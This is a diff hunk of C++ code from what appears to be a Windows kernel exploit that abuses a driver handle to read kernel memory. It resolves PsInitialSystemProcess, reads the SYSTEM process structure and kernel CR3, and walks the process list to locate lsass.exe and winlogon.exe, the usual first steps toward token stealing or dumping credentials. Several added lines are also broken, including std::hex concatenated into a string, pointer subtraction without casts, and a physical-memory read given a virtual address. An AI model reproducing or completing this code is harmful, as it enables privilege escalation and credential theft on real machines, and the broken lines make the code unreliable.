@@ -220,26 +220,45 @@ int main() {
         return 1;
     }
 
-    uint64_t PsInitialSystemProcessVA = 0x8755E0; // Set manually or leak
-    uint64_t sysEP = 0;
-    if (!ReadVA(h, 0, PsInitialSystemProcessVA, &sysEP, 8)) {
-        WriteLog("[-] Could not read PsInitialSystemProcess.");
+        // Get kernel base dynamically
+    LPVOID drivers[1024];
+    DWORD needed;
+    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
+        WriteLog("[-] Could not enumerate device drivers.");
         return 1;
     }
+    uint64_t kernelBase = reinterpret_cast<uint64_t>(drivers[0]);
+    WriteLog("[*] Kernel base: 0x" + std::hex + std::to_string(kernelBase));
+
+    // Compute offset using the DLL + export parsing trick
+    // This requires ntoskrnl to map in user space earlier
+    ULONG_PTR offset = GetProcAddress(LoadLibraryA("ntoskrnl.exe"), "PsInitialSystemProcess")
+                        - reinterpret_cast<ULONG_PTR>(GetModuleHandleA("ntoskrnl.exe"));
+    WriteLog("[*] Symbol offset: 0x" + std::hex + std::to_string(offset));
+
+    uint64_t psInitVA = kernelBase + offset;
+    WriteLog("[*] Resolved PsInitialSystemProcess VA: 0x" + std::hex + std::to_string(psInitVA));
+    uint64_t systemEP = 0;
+    if (!ReadPhys(h, psInitVA, &systemEP, sizeof(systemEP))) {
+        WriteLog("[-] Failed to read PsInitialSystemProcess from VA.");
+        return 1;
+    }
+    WriteLog("[+] SYSTEM EPROCESS at: 0x" + std::hex + std::to_string(systemEP));
+
 
     uint64_t cr3 = 0;
-    if (!ReadVA(h, 0, sysEP + OFFSET_DirectoryTableBase, &cr3, 8)) {
+    if (!ReadVA(h, 0, systemEP + OFFSET_DirectoryTableBase, &cr3, 8)) {
         WriteLog("[-] Could not read kernel CR3.");
         return 1;
     }
 
     uint64_t lsassEP = 0;
     uint64_t winlogonEP = 0;
-    if (!FindEP(h, cr3, sysEP + OFFSET_ActiveProcessLinks, "lsass.exe", lsassEP)) {
+    if (!FindEP(h, cr3, systemEP + OFFSET_ActiveProcessLinks, "lsass.exe", lsassEP)) {
         WriteLog("[-] LSASS not found.");
         return 1;
     }
-    if (!FindEP(h, cr3, sysEP + OFFSET_ActiveProcessLinks, "winlogon.exe", winlogonEP)) {
+    if (!FindEP(h, cr3, systemEP + OFFSET_ActiveProcessLinks, "winlogon.exe", winlogonEP)) {
         WriteLog("[-] SYSTEM process not found.");
         return 1;
     }
